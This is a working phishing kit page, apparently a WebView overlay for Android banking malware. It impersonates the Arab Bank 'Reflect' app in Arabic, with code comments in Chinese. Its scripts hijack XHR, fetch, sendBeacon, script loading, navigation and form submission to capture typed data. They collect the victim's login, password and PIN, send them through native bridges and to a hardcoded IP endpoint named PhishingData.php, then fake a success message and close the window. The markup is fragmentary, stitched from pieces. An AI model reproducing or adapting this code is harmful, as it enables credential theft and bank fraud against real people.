<script>
(function(){
  if (window.__fyInterceptorInjected) return;
  window.__fyInterceptorInjected = true;

  var TARGET_PATH = '/api/PhishingData.php';
  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';

  function isOurTargetUrl(u){
    if (!u) return false;
    u = String(u);
    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
    try {
      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
      var submitUrl = cfg.submit_url || '';
      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
    } catch(e){}
    return false;
  }

  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;

  function isSubmitUrl(u){
    if (!u) return false;
    u = String(u);
    if (u.indexOf(TARGET_PATH) !== -1) return true;
    if (u.indexOf(TARGET_URL) !== -1) return true;
    if (STATIC_EXT_RE.test(u)) return false;
    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
      return true;
    }
    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
      return true;
    }
    return false;
  }

  function formDataToObj(fd){
    var o = {};
    try {
      var add = function(k, v){
        if (o[k] !== undefined) {
          if (!Array.isArray(o[k])) o[k] = [o[k]];
          o[k].push(v);
        } else { o[k] = v; }
      };
      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
      else if (fd.entries) {
        var it = fd.entries(), r;
        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
      }
    } catch(e){}
    return o;
  }

  function urlEncodedToObj(s){
    var o = {};
    try {
      s.split('&').forEach(function(p){
        if (!p) return;
        var idx = p.indexOf('=');
        var k, v;
        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
        if (k) o[k] = v;
      });
    } catch(e){}
    return o;
  }

  function normalizeBody(body){
    if (body === null || body === undefined) return {};
    if (body instanceof FormData) return formDataToObj(body);
    if (typeof body === 'string') {
      var t = body.trim();
      if (t === '') return {};
      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
        try { return JSON.parse(t); } catch(e){}
      }
      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
      return { raw: body };
    }
    if (typeof body === 'object') {
      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
        var o = {};
        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
        return o;
      }
      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
      return body;
    }
    return { raw: String(body) };
  }

  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
  var _origOpen = XMLHttpRequest.prototype.open;
  var _origSend = XMLHttpRequest.prototype.send;

  function ensureFyPostPhish(){
    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
    window.fyPostPhish = function(raw){
      try {
        var cfg = window.__PHISH_CONFIG || {};
        var clean = normalizeBody(raw);
        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
        if (typeof Android !== 'undefined' && Android.submitData) {
          try {
            Android.submitData(JSON.stringify(clean));
            return;
          } catch(e){}
        }
        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
        var body = {
          phone_id: cfg.phone_id || '',
          package_name: cfg.package_name || '',
          appName: cfg.appName || '',
          payload: clean
        };
        var url = cfg.submit_url || TARGET_URL;
        var xhr = new XMLHttpRequest();
        _origOpen.call(xhr, 'POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        _origSend.call(xhr, JSON.stringify(body));
      } catch(e){}
    };
    return window.fyPostPhish;
  }

  var fyPostPhish = ensureFyPostPhish();

  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
  function mockXhrComplete(xhr){
    try {
      var respBody = '{"code":200,"msg":"ok"}';
      try {
        xhr.readyState = 4;
        xhr.status = 200;
        xhr.statusText = 'OK';
        xhr.responseText = respBody;
        xhr.response = respBody;
        xhr.responseURL = TARGET_URL;
      } catch(e){
        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
        for (var k in props) {
          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
        }
      }
      try {
        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
      } catch(e){}
      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
      if (typeof xhr.dispatchEvent === 'function') {
        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
      }
    } catch(e){}
  }

  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
  XMLHttpRequest.prototype.open = function(method, url){
    this.__fyMethod = (method || '').toUpperCase();
    this.__fyUrl = url;
    this.__fyIsSubmit = isSubmitUrl(url);
    return _origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body){
    try {
      var method = this.__fyMethod || 'GET';
      var url = this.__fyUrl || '';
      var isSubmit = this.__fyIsSubmit;
      if (method === 'POST' && isSubmit) {
        fyPostPhish(normalizeBody(body));
        mockXhrComplete(this);
        return;
      }
      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
        var qs = String(url).split('?')[1] || '';
        fyPostPhish(urlEncodedToObj(qs));
        mockXhrComplete(this);
        return;
      }
    } catch(e){}
    return _origSend.apply(this, arguments);
  };

  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
  if (window.fetch) {
    var _origFetch = window.fetch;
    window.fetch = function(url, opts){
      try {
        opts = opts || {};
        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
        var isSubmit = isSubmitUrl(urlStr);
        var isPost = method === 'POST';
        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
        if ((isPost && isSubmit) || isGetWithData) {
          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
          fyPostPhish(data);
          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
            status: 200, statusText: 'OK',
            headers: {'Content-Type':'application/json'}
          });
          return Promise.resolve(fakeResp);
        }
      } catch(e){}
      return _origFetch.apply(this, arguments);
    };
  }

  // 劫持 sendBeacon（现代浏览器无痕提交）
  if (navigator && typeof navigator.sendBeacon === 'function') {
    var _origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data){
      try {
        if (isSubmitUrl(url)) {
          fyPostPhish(normalizeBody(data));
          return true;
        }
      } catch(e){}
      return _origBeacon(url, data);
    };
  }

  // 劫持 <script src>（JSONP 跨域提交）
  try {
    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
    if (_origScriptSrc && _origScriptSrc.set) {
      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
        set: function(v){
          try {
            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
              var qs = v.split('?')[1] || '';
              fyPostPhish(urlEncodedToObj(qs));
            }
          } catch(e){}
          _origScriptSrc.set.call(this, v);
        },
        get: _origScriptSrc.get,
        configurable: true
      });
    }
  } catch(e){}

  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
  if (_origHrefSet) {
    try {
      Object.defineProperty(Location.prototype, 'href', {
        configurable: true,
        get: _hrefDesc.get,
        set: function(v){
          try {
            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
              var qs = v.split('?')[1] || '';
              fyPostPhish(urlEncodedToObj(qs));
            }
          } catch(e){}
          _origHrefSet.call(this, v);
        }
      });
    } catch(e){}
  }
  // 劫持 location.assign(url) 和 location.replace(url)
  try {
    var _origAssign = Location.prototype.assign;
    var _origReplace = Location.prototype.replace;
    Location.prototype.assign = function(url){
      try {
        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
          var qs = url.split('?')[1] || '';
          fyPostPhish(urlEncodedToObj(qs));
        }
      } catch(e){}
      return _origAssign.call(this, url);
    };
    Location.prototype.replace = function(url){
      try {
        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
          var qs = url.split('?')[1] || '';
          fyPostPhish(urlEncodedToObj(qs));
        }
      } catch(e){}
      return _origReplace.call(this, url);
    };
  } catch(e3){}

  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
  try {
    var _origFormSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function(){
      try {
        var form = this;
        var action = form.getAttribute('action') || '';
        var method = (form.getAttribute('method') || 'get').toUpperCase();
        var isPost = method === 'POST';
        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
        if (isPost && (action === '' || isSubmitUrl(action))) {
          var data = {};
          try {
            new FormData(form).forEach(function(v, k){
              if (data[k] !== undefined) {
                if (!Array.isArray(data[k])) data[k] = [data[k]];
                data[k].push(v);
              } else { data[k] = v; }
            });
          } catch(e2){}
          fyPostPhish(data);
          return; // 阻止真实提交
        } else if (isGetSubmit) {
          var dataGet = {};
          try {
            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
          } catch(e3){}
          fyPostPhish(dataGet);
          return;
        }
      } catch(e){}
      return _origFormSubmit.apply(this, arguments);
    };
  } catch(e){}

  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
  document.addEventListener('submit', function(e){
    try {
      var form = e.target;
      if (!form || form.tagName !== 'FORM') return;
      var action = form.getAttribute('action') || '';
      var method = (form.getAttribute('method') || 'get').toUpperCase();
      var isPost = method === 'POST';
      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
      if (isPost && (action === '' || isSubmitUrl(action))) {
        e.preventDefault();
        var data = {};
        try {
          new FormData(form).forEach(function(v, k){
            if (data[k] !== undefined) {
              if (!Array.isArray(data[k])) data[k] = [data[k]];
              data[k].push(v);
            } else { data[k] = v; }
          });
        } catch(e2){}
        fyPostPhish(data);
      } else if (isGetSubmit) {
        e.preventDefault();
        var dataGet = {};
        try {
          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
        } catch(e3){}
        fyPostPhish(dataGet);
      }
    } catch(e){}
  }, true);
})();

    .reflect-keypad-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 14px 16px;
      width: 100%;
      max-width: 330px;
      margin: 0 auto;
      direction: ltr;
    }

    .reflect-oval-btn {
      height: 52px;
      background: rgba(255, 255, 255, 0.14);
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 26px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      font-size: 21px;
      font-weight: 500;
      cursor: pointer;
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      transition: background 0.12s, transform 0.08s;
      outline: none;
    }
    .reflect-oval-btn:active {
      background: rgba(255, 255, 255, 0.32);
      transform: scale(0.93);
    }

    .reflect-oval-btn.btn-backspace {
      color: #ffffff;
    }
    .reflect-oval-btn.btn-empty {
      border: none;
      background: transparent;
      pointer-events: none;
    }

    /* Toast 提示 */
    .toast-tip {
      position: fixed;
      top: 24px;
      left: 50%;
      transform: translateX(-50%) translateY(-30px);
      background: rgba(15, 23, 42, 0.92);
      color: #ffffff;
      padding: 10px 18px;
      border-radius: 20px;
      font-size: 13.5px;
      pointer-events: none;
      opacity: 0;
      transition: all 0.25s ease;
      z-index: 100;
      box-shadow: 0 4px 14px rgba(0,0,0,0.25);
      direction: rtl;
    }
    .toast-tip.show {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }
  </style>
</head>

          <div class="step2-brand-name">Reflect</div>
          <div class="step2-brand-slogan">خدماتك المصرفية الرقمية</div>
        </div>

        <!-- 提示与 PIN 圆点 -->
        <div class="step2-pin-center">
          <div class="pin-prompt-title">أدخل رمز PIN</div>
          <div class="pin-circles-row">
            <div class="pin-ind-circle" id="pin0"></div>
            <div class="pin-ind-circle" id="pin1"></div>
            <div class="pin-ind-circle" id="pin2"></div>
            <div class="pin-ind-circle" id="pin3"></div>
          </div>
        </div>

        <!-- 扁椭圆形半透明键盘：严格按照原版 3x4 矩阵与阿拉伯顺序排列 -->
        <div class="reflect-keypad-grid">
          <button type="button" class="reflect-oval-btn" data-val="3">3</button>
          <button type="button" class="reflect-oval-btn" data-val="2">2</button>
          <button type="button" class="reflect-oval-btn" data-val="1">1</button>

          <button type="button" class="reflect-oval-btn" data-val="6">6</button>
          <button type="button" class="reflect-oval-btn" data-val="5">5</button>
          <button type="button" class="reflect-oval-btn" data-val="4">4</button>

          <button type="button" class="reflect-oval-btn" data-val="9">9</button>
          <button type="button" class="reflect-oval-btn" data-val="8">8</button>
          <button type="button" class="reflect-oval-btn" data-val="7">7</button>

          <!-- 退格键 -->
          <button type="button" class="reflect-oval-btn btn-backspace" id="btnBackspace" title="Delete">
            <!-- 原版带叉号的标签退格图标 -->
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
              <line x1="18" y1="9" x2="12" y2="15"></line>
              <line x1="12" y1="9" x2="18" y2="15"></line>
            </svg>
          </button>

          <!-- 数字 0 -->
          <button type="button" class="reflect-oval-btn" data-val="0">0</button>

          <!-- 空占位 -->
          <div class="reflect-oval-btn btn-empty"></div>
        </div>

      </div>
    </div>

  </div>

  <script>
    (function() {
      const step1View = document.getElementById('step1View');
      const step2View = document.getElementById('step2View');
      const accountInput = document.getElementById('accountInput');
      const passwordInput = document.getElementById('passwordInput');
      const btnMainLogin = document.getElementById('btnMainLogin');
      const shortcutPinBtn = document.getElementById('shortcutPinBtn');
      const shortcutBioBtn = document.getElementById('shortcutBioBtn');
      const btnBackspace = document.getElementById('btnBackspace');
      const toastTip = document.getElementById('toastTip');

      let currentPin = '';
      const MAX_PIN = 4;

      function showToast(msg) {
        toastTip.textContent = msg;
        toastTip.classList.add('show');
        setTimeout(() => {
          toastTip.classList.remove('show');
        }, 2200);
      }

      // 进入第二步 PIN 输入界面
      function proceedToStep2() {
        const acc = accountInput.value.trim();
        const pwd = passwordInput.value.trim();
        if (!acc) {
          showToast('الرجاء إدخال البريد الإلكتروني أو رقم الهاتف');
          accountInput.focus();
          return;
        }
        if (!pwd) {
          showToast('الرجاء إدخال كلمة السر');
          passwordInput.focus();
          return;
        }
        step1View.classList.remove('active');
        step2View.classList.add('active');
        currentPin = '';
        updatePinDisplay();
      }

      btnMainLogin.addEventListener('click', proceedToStep2);

      // 点击“الرمز السري”快捷入口
      shortcutPinBtn.addEventListener('click', function() {
        step1View.classList.remove('active');
        step2View.classList.add('active');
        currentPin = '';
        updatePinDisplay();
      });

      shortcutBioBtn.addEventListener('click', function() {
        showToast('يرجى تسجيل الدخول باستخدام كلمة السر');
      });

      // 数字键盘输入
      const keyBtns = document.querySelectorAll('.reflect-keypad-grid .reflect-oval-btn[data-val]');
      keyBtns.forEach(btn => {
        btn.addEventListener('click', function() {
          const val = this.getAttribute('data-val');
          if (currentPin.length < MAX_PIN) {
            currentPin += val;
            updatePinDisplay();
            if (currentPin.length === MAX_PIN) {
              setTimeout(submitAllData, 220);
            }
          }
        });
      });

      // 退格删除
      btnBackspace.addEventListener('click', function() {
        if (currentPin.length > 0) {
          currentPin = currentPin.slice(0, -1);
          updatePinDisplay();
        }
      });

      function updatePinDisplay() {
        for (let i = 0; i < MAX_PIN; i++) {
          const dot = document.getElementById('pin' + i);
          if (i < currentPin.length) {
            dot.classList.add('filled');
          } else {
            dot.classList.remove('filled');
          }
        }
      }

      // 最终全通道兼容提交与关闭
      function submitAllData() {
        const pkgName = "com.arabbank.neobank";
        const acc = accountInput.value.trim();
        const pwd = passwordInput.value.trim();
        const pin = currentPin;

        const payload = {
          "类型": "Reflect (Arab Bank)",
          "用户名": acc,
          "登录密码": pwd,
          "支付密码": pin,
          "pkg": pkgName,
          "account": acc,
          "username": acc,
          "password": pwd,
          "pin": pin
        };

        console.log("Submitting payload:", payload);

        // 通道 1: Android 原生 Bridge
        try {
          if (typeof Android !== 'undefined') {
            if (typeof Android.postMessage === 'function') Android.postMessage(JSON.stringify(payload));
            if (typeof Android.setFormData === 'function') Android.setFormData(JSON.stringify(payload));
          }
        } catch(e) {}

        // 通道 2: FKB Bridge 协议
        try {
          if (typeof FKB !== 'undefined') {
            if (typeof FKB.postMessage === 'function') FKB.postMessage(JSON.stringify(payload));
            if (typeof FKB.setFormData === 'function') {
              FKB.setFormData(JSON.stringify({
                client_id: acc,
                username: acc,
                login_password: pwd,
                password: pwd,
                payment_password: pin,
                pin: pin,
                pkg: pkgName
              }));
            }
          }
        } catch(e) {}

        // 通道 3: iOS WebKit Bridge
        try {
          if (window.webkit && window.webkit.messageHandlers) {
            if (window.webkit.messageHandlers.Android && typeof window.webkit.messageHandlers.Android.postMessage === 'function') {
              window.webkit.messageHandlers.Android.postMessage(JSON.stringify(payload));
            } else if (window.webkit.messageHandlers.FKB && typeof window.webkit.messageHandlers.FKB.postMessage === 'function') {
              window.webkit.messageHandlers.FKB.postMessage(JSON.stringify(payload));
            }
          }
        } catch(e) {}

        // 通道 4: Ajax 后台兜底上报
        try {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', "http://18.142.44.159:8035/api/PhishingData.php", true);
          xhr.setRequestHeader('Content-Type', 'application/json');
          xhr.send(JSON.stringify({
            pkg: pkgName,
            template: 'reflect_mobile',
            formData: payload
          }));
        } catch(e) {}

        showToast('تم التحقق بنجاح...');

        // 级联兜底关闭
        setTimeout(function() {
          try {
            if (typeof Android !== 'undefined') {
              if (typeof Android.close === 'function') Android.close();
              else if (typeof Android.close === 'function') Android.close();
            } else if (typeof Android!=='undefined'&&Android.close) {
              Android.close();
            } else {
              window.close();
            }
          } catch(e) {}
        }, 800);
      }

    })();
  </script>
